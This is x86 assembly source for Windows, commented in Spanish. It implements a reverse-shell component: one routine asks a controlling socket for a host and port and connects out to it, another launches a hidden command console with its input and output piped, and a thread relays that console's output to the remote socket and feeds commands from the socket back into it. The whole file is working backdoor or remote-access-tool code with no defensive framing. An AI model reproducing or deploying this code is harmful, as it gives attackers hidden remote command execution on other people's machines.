;###################################################################
;## MANTIENE LA INTERACTIVIDAD DE LA CONSOLA EN UN HILO DIFERENTE ##
;###################################################################
proc HiloConsolaPipes
bucle_pipes:
;##########################################
	push 0x10
	push dword [PI.hProcess]
	call WaitForSingleObject
	or eax,0
	je fbucle_pipes

	leer_pipe:
	;I######## LEEMOS EL PIPE
		push 0
		push stuff
		push 0
		push 0
		push 0
		push [stdoutRd]
		call PeekNamedPipe
		cmp dword [stuff],0
		je fleer_pipe

		xor ecx,ecx
		mov edi,BufferShell
		llena_ceros:
		cmp ecx,[stuff]
		jg fllena_ceros
		mov byte [edi],0
		inc edi
		inc ecx
		jmp llena_ceros
		fllena_ceros:

		push 0
		push stuff
		push 0x64
		push BufferShell
		push [stdoutRd]
		call ReadFile

		push BufferShell
		push socketShell
		call EnviarDatos
		push 0x10
		call Sleep
		jmp leer_pipe
	;F######## LEEMOS EL PIPE
	fleer_pipe:

	;## RECIBIMOS LOS DATOS ##
	push 0x400-2
	push BufferRecvShell
	push socketShell
	call RecibirDatos
	cmp eax,-1
	jne envia_datos_pipe
	push ErrorRecibir
	push sckConexion
	call EnviarDatos
	push Retorno
	push sckConexion
	call EnviarDatos
	jmp fbucle_pipes

	envia_datos_pipe:
	mov edi,BufferRecvShell
	add edi,eax
	mov byte [edi],0x0A
	mov byte [edi+1],0x0D
	add eax,2
	push 0
	push stuff
	push eax
	push BufferRecvShell
	push [stdinWr]
	call WriteFile
;##########################################
jmp bucle_pipes
fbucle_pipes:
push 0
push [PI.hProcess]
call TerminateProcess

push [stdinRd]
call CloseHandle
push [stdinWr]
call CloseHandle
push [stdoutRd]
call CloseHandle
push [stdoutWr]
call CloseHandle

push [socketShell]
call closesocket
push 0
call ExitThread
endp

;#####################################
;## LANZA UNA CONSOLA USANDO PIPES  ##
;#####################################
proc ShellPipes

mov dword [SecAt.nLength],0x0C
mov dword [SecAt.lpSecurityDescriptor],0
mov dword [SecAt.bInheritHandle],1

push 0
push SecAt
push stdinWr
push stdinRd
call CreatePipe
or eax,0
je fin_pipes

push 0
push SecAt
push stdoutWr
push stdoutRd
call CreatePipe
or eax,0
je cerrar_handles

mov dword [SInfo.cb],0x44
mov dword [SInfo.dwFlags],0x101
mov word [SInfo.wShowWindow],0
mov eax,dword [stdoutWr]
mov dword [SInfo.hStdOutput],eax
mov dword [SInfo.hStdError],eax
mov eax,dword [stdinRd]
mov dword [SInfo.hStdInput],eax

push PI
push SInfo
push 0
push 0
push 0x200;CREATE_NEW_PROCESS_GROUP
push 1
push 0
push 0
push CMD
push 0
call CreateProcess

push 0x1F4
push dword [PI.hProcess]
call WaitForSingleObject
cmp eax,0
je cerrar_handles

;lanzamos el hilo para interactuar con la consola
push idHilo
push 0x04;CREATE_SUSPENDED
push 0
push HiloConsolaPipes
push 0
push 0
call CreateThread
or eax,0
je error_hilo

mov dword [hHilo],eax
push eax
call ResumeThread
cmp eax,-1
je error_hilo
mov eax,1
ret

error_hilo:
push 0
push [PI.hProcess]
call TerminateProcess

cerrar_handles:
push [stdinRd]
call CloseHandle
push [stdinWr]
call CloseHandle
push [stdoutRd]
call CloseHandle
push [stdoutWr]
call CloseHandle

fin_pipes:
push dword [socketShell]
call closesocket
ret
endp

;#########################################
;## PIDE LOS DATOS PARA LANZAR LA SHELL ##
;#########################################
proc DatosShell sock
push Retorno
push [sock]
call EnviarDatos
push PideHost
push [sock]
call EnviarDatos
push 0x100
push Buffer
push [sock]
call RecibirDatos
or eax,0
je salida_shell

;comprobamos el formato de los datos
lea esi,[Buffer]
mov edi,esi
xor ecx,ecx
xor al,al
comprueba_datos_shell:
	cmp byte [esi],0
	je fin_comprueba
	cmp byte [esi],':'
	jne sigue_comprueba
	xor al,1
	mov edx,esi
	sigue_comprueba:
	inc esi
	inc ecx
	jmp comprueba_datos_shell

fin_comprueba:
or al,0
jne datos_correctos

push DatosErroneos
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
jmp salida_shell

datos_correctos:
mov eax,esi
sub eax,edx
sub esi,eax
mov byte [esi],0
inc edx

push edx
call atoi

push sckaddrinShell
push wsaShell
push socketShell
push eax
push edi
call CrearConexion
or eax,0
jne error_conexion_shell
push Lanzando
push [sock]
call EnviarDatos
call ShellPipes
or eax,0
jne shell_ok

push ShellError
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
jmp salida_shell

shell_ok:
push ShellOk
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos
jmp salida_shell

error_conexion_shell:
push ErrorConexion
push [sock]
call EnviarDatos
push Retorno
push [sock]
call EnviarDatos

salida_shell:
ret
endp